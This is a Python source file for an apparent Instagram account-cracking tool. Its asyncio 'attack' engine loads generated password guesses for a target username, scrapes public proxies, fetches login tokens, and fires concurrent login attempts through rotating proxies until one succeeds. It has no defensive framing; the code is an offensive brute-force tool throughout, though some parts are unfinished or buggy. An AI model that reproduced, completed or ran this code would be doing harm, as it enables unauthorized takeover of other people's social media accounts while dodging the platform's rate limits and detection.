from __future__ import absolute_import

import logging
import logging.config

import asyncio
import time
import signal

from app import settings

from app.lib import exceptions
from app.lib.logging import EngineLogger
from app.lib.sessions import InstagramSession, ProxySession
from app.lib.users import User
from app.lib.utils import auto_logger


__all__ = ('EngineAsync', )


class Engine(object):

    __loggers__ = {
        '__base__': 'Instagram Engine',
        'attack': 'Attack',
        'consume_passwords': 'Login with Proxy',
        'populate_proxies': 'Populating Proxies',
        'populate_passwords': 'Populating Passwords',
        'get_tokens': 'Fetching Token',
        'consume_attempts': 'Storing Attempted Password',
    }

    def __init__(self, username):
        self.user = User(username)
        logging.setLoggerClass(EngineLogger)
        self.log = logging.getLogger(self.__loggers__['__base__'])


class EngineAsync(Engine):

    def __init__(self, username):
        super(EngineAsync, self).__init__(username)
        self.lock = asyncio.Lock()

        self.stop_event = asyncio.Event()
        self.passwords = asyncio.Queue()
        self.attempts = asyncio.Queue()

        self.proxy_list = []

    @auto_logger
    async def populate_passwords(self, loop, log):
        """
        Retrieves passwords generated passwords that have not been attempted
        from the User object and populates the password queue.
        """
        for password in self.user.get_new_attempts():
            self.passwords.put_nowait(password)

        if self.passwords.empty():
            raise exceptions.EngineException("No new passwords to try.")

        log.info(f"Populated {self.passwords.qsize()} Passwords")

    @auto_logger
    async def populate_proxies(self, loop, log):
        """
        Retrieves proxies by using the ProxyApi to scrape links defined
        in settings.  Each returned response is parsed and converted into
        a list of Proxy objects.
        """
        def callback(fut):
            result = fut.result()
            for proxy in result:
                if proxy not in self.proxy_list:
                    self.proxy_list.append(proxy)

        tasks = []
        async with ProxySession() as session:
            for url in settings.PROXY_LINKS:
                log.info(f"Scraping Proxies at {url}")
                task = asyncio.ensure_future(session.get_proxies(
                    url,
                ))
                tasks.append(task)
                task.add_done_callback(callback)

            log.info(f"Scraping Proxies at {settings.EXTRA_PROXY}")
            task = asyncio.ensure_future(session.get_extra_proxies())
            tasks.append(task)
            task.add_done_callback(callback)

            await asyncio.gather(*tasks, return_exceptions=True)

        log.info(f"Populated {len(self.proxy_list)} Proxies")

    @auto_logger(show_running=False)
    async def get_tokens(self, loop, log):
        """
        Returns a list of tokens based on 20 concurrent requests to the Instagram
        API.  On average, it returns about 6-7 tokens, which we will use as fallbacks
        in case we need them when requests fail for token related reasons.

        The higher the value of TOKEN_REQUEST_LIMIT (i.e. the number of
        concurrent requests to retrieve a token), the slighly longer this process
        takes, but the more bad proxies we can rule out from the get go.
        """
        def callback(fut):
            exc = fut.exception()
            if exc:
                if isinstance(exc, exceptions.BadProxyException):
                    self.log.warn(str(exc))
                    self.proxy_list.remove(exc.proxy)
                else:
                    self.log.errors(str(exc))

        async def find_tokens():
            tasks = []
            async with InstagramSession() as session:
                for i in range(settings.TOKEN_REQUEST_LIMIT):
                    proxy = self.proxy_list[i]
                    task = asyncio.ensure_future(session.get_token(proxy))
                    task.add_done_callback(callback)
                    tasks.append(task)

                return await asyncio.gather(*tasks, return_exceptions=True)

        async def filter_tokens(results):
            """
            For whatever reason, raising TokenNotInResponse in the session
            is causing a None value to be returned instead of the exception.
            For now, we will just filter out None as well.
            """
            tokens = []
            for result in results:
                if not isinstance(result, Exception) and result is not None:
                    tokens.append(result)
            return tokens

        # We do this 20 concurrent requests at a time, but there is a chance that
        # all of the proxies are bad, so we would have to keep going.
        results = []
        while not results:
            results = await find_tokens()

        return await filter_tokens(results)

    @auto_logger
    async def attack(self, loop, log):

        # May want to catch other signals too - these are not currently being
        # used, but could probably be expanded upon.
        signals = (signal.SIGHUP, signal.SIGTERM, signal.SIGINT)
        for s in signals:
            loop.add_signal_handler(
                s, lambda s=s: asyncio.create_task(self.shutdown(s, loop)))

        try:
            prep_tasks = (
                loop.create_task(
                    self.handle_exception(
                        self.populate_proxies(loop), loop
                    )
                ),
                loop.create_task(
                    self.handle_exception(
                        self.populate_passwords(loop), loop
                    )
                )
            )

            await asyncio.gather(*prep_tasks)

            """
            Right now, we are not going to wrap this in handle_exceptions
            because we do not have the exception handling sealed off enough
            yet in order to allow the failed requests to not close the loop.

            This might have something to do with return_exceptions **kwarg in the
            asyncio.gather_tasks call.
            """
            tokens = await asyncio.ensure_future(self.get_tokens(loop))

            attack_tasks = (
                loop.create_task(
                    self.handle_exception(
                        self.consume_passwords(tokens, loop), loop
                    )
                ),
                loop.create_task(
                    self.handle_exception(
                        self.consume_attempts(loop), loop
                    )
                )
            )
            self.attempts.put_nowait("lamb")
            await asyncio.gather(*attack_tasks)
            self.attempts.put_nowait("BALH")

        finally:
            self.log.info('Cleaning up')
            loop.stop()

    @auto_logger(show_running=False)
    async def consume_attempts(self, tokens, log):
        while not self.stop_event.is_set():
            try:
                attempt = self.attempts.get_nowait()
            except asyncio.QueueEmpty:
                continue
            else:
                async with self.lock:
                    log.info(f"Storing User Attempt {attempt}")
                    self.user.add_password_attempt(attempt)

    @auto_logger(show_running=False)
    async def consume_passwords(self, tokens, log):

        def callback(fut):
            exc = fut.exception()
            if exc:
                if isinstance(exc, exceptions.BadProxyException):
                    self.log.warn(str(exc))
                    self.proxy_list.remove(exc.proxy)
                else:
                    self.log.errors(str(exc))

        # def callback(fut):
        #     exc = fut.exception()
        #     if exc:
        #         if isinstance(exc, exceptions.BadProxyException):
        #             self.log.warn(str(exc))
        #             self.proxy_list.remove(proxy)
        #         else:
        #             raise exc
        #     else:
        #         result = fut.result()
        #         if result.accessed:
        #             log.success(f"Authenticated!")
        #             self.stop_event.set()
        #         else:
        #             self.attempts.put_nowait(password)

        while not self.stop_event.is_set():
            try:
                password = self.passwords.get_nowait()
            except asyncio.QueueEmpty:
                continue
            else:
                async with InstagramSession() as session:
                    assert self.token is not None

                    tasks = []
                    while not self.stop_event.is_set() and len(self.proxy_list):
                        async with self.lock:
                            proxy = self.proxy_list[0]

                        task = asyncio.ensure_future(session.login(
                            self.user.username,
                            password,
                            self.token,
                            proxy,
                        ))

                        task.add_done_callback(callback)
                        tasks.append(task)

                    await asyncio.gather(*tasks, return_exceptions=True)

    async def handle_exception(self, coro, loop):
        """
        This does not seem to be working properly for all situations.
        """
        try:
            await coro
        except Exception as e:
            self.log.error(str(e))
            loop.stop()

    async def shutdown(self, signal, loop):

        self.log.info(f'Received exit signal {signal.name}...')
        tasks = [t for t in asyncio.all_tasks() if t is not
            asyncio.current_task()]

        [task.cancel() for task in tasks]

        self.log.info('Canceling outstanding tasks...')
        await asyncio.gather(*tasks)

        loop.stop()
        self.log.success('Shutdown complete.')
